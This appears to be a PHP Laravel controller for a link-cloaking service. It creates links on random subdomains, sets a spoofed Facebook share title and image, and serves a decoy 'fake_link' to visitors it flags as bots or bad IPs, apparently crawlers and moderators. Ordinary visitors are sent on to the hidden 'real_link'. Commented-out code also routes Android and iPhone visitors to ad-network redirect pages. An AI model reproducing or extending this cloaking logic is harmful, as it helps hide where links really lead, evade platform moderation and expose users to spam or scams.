<?php

namespace App\Http\Controllers;

use App\Domain;
use App\Link;
use App\Service\Helper;
use Illuminate\Support\Facades\Redis;

class LinksController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth')->except(['show', 'getInfo']);
    }

    public function index()
    {
        $links = Link::where('user_id', '!=', '1')->latest()->paginate(20);
        // $links = auth()->user()->links()->latest()->paginate(20);
        $linksAdmin = Link::latest()->paginate(20);

        return view('links.index', compact('links', 'linksAdmin'));
    }
    public function create()
    {
        return view('links.create');
    }

    public function store()
    {
        $this->validate(request(), [
            'fake_link' => 'required',
            'real_link' => 'required',
        ]);

        $domain = Domain::orderByRaw('RAND()')->get(['name']);
        $domainName = $domain['0']->name;

        $sub = str_random(3);
        $linkBasic = str_random(60);
        $queryKey = str_random(3);
        $queryValue = str_random(7);
        // if (strpos(request('fake_link'), 'webtretho') !== false || strpos(request('fake_link'), 'tamsueva') !== false) {
        //     $title = 'Webtretho - Cộng đồng phụ nữ lớn nhất Việt Nam';
        // } else {
        //     $title = $this->getPageTitle(request('fake_link'));
        // }

        $fullLink = 'http://' . auth()->user()->username . $sub . '.' . $domainName . '/' . $linkBasic;
        // $fullLink = 'http://' . $sub . '.' . $domainName . '/' . $linkBasic;

        // $tinyUrlLink = $this->createTinyUrlLink($fullLink);

        $link = Link::create([
            'title' => 'Loading...',
            'user_id' => auth()->id(),
            'fake_link' => request('fake_link'),
            'real_link' => request('real_link'),
            'link_basic' => $linkBasic,
            'query_key' => $queryKey,
            'query_value' => $queryValue,
            'sub' => $sub,
            'domain' => $domainName,
            'full_link' => $fullLink,
            'tiny_url_link' => 'http://tinyurl.com',
            'user_name' => auth()->user()->name,
        ]);

if (request()->has('title') || request()->has('description') || request()->has('image') || request()->has('website')) {
            $lin = 'https://www.facebook.com/sharer/sharer.php?u=' . $fullLink . '&title=' . request('title') . '&description=' . request('description') . '&picture=' . request('image') . '&caption=' . request('website');

            flash('Tạo link thành công!', 'success');

            return back()->withInput(request()->all())->withLink($link)->withLin($lin);
        } else {
            flash('Tạo link thành công!', 'success');

            return back()->withInput(request()->all())->withLink($link);
        }
    }

    public function show($link)
    {
        if (Redis::exists('links.' . $link)) {
            $realLink = Redis::get('links.' . $link);
            $title = Redis::get('links.title.' . $link);
            $fakeLink = Redis::get('links.fake.' . $link);
        } else {
            $url = Link::where('link_basic', '=', $link)->first();

            $realLink = $url->real_link;
            $title = $url->title;
            $fakeLink = $url->fake_link;

            Redis::set('links.' . $link, $realLink);
            Redis::set('links.title.' . $link, $title);
            Redis::set('links.fake.' . $link, $fakeLink);
        }

        $ip = ip2long(request()->ip());
        if (Helper::checkBadUserAgents() === true || Helper::checkBadIp($ip)) {
            // Client::create([
            //     'ip' => request()->ip(),
            //     'user_agent' => request()->header('User-Agent'),
            //     'status' => 'blocked',
            // ]);
            return redirect($fakeLink);
        }

        // $query = request()->query();

        // if (!$query) {
        //     return redirect('http://google.com');
        // }

        Redis::incr('links.clicks' . $link);

        // Link::where('link_basic', '=', $link)->increment('clicks');

        // Client::create([
        //     'ip' => request()->ip(),
        //     'user_agent' => request()->header('User-Agent'),
        //     'status' => 'allowed',
        // ]);
        //
        // Redis::set('client.ip.' . request()->ip(), request()->ip());
        // Redis::set('client.user_agent.' . request()->header('User-Agent'), request()->header('User-Agent'));

        // $currentHour = (int) date('G');

        // $currentSecond = (int) date('s');

        // // if ($currentHour >= 0 && $currentHour <= 6 && Agent::isAndroidOS()) {
        // //     return view('links.redirectphilnews', compact('title'));
        // // }

        // if ($currentSecond >= 27 && $currentSecond <= 31 && Agent::isAndroidOS()) {
        //     return view('links.redirectphilnews', compact('title'));
        // }

        // if (Agent::is('iPhone')) {
        //     return view('links.redirectyllix');
        // }

        return view('links.redirect', compact('realLink', 'title'));
    }

    public function edit(Link $link)
    {
        return view('links.edit', compact('link'));
    }

    public function destroy(Link $link)
    {
        $link->delete();

        flash('Xoá thành công!', 'success');

        return back();
    }

}
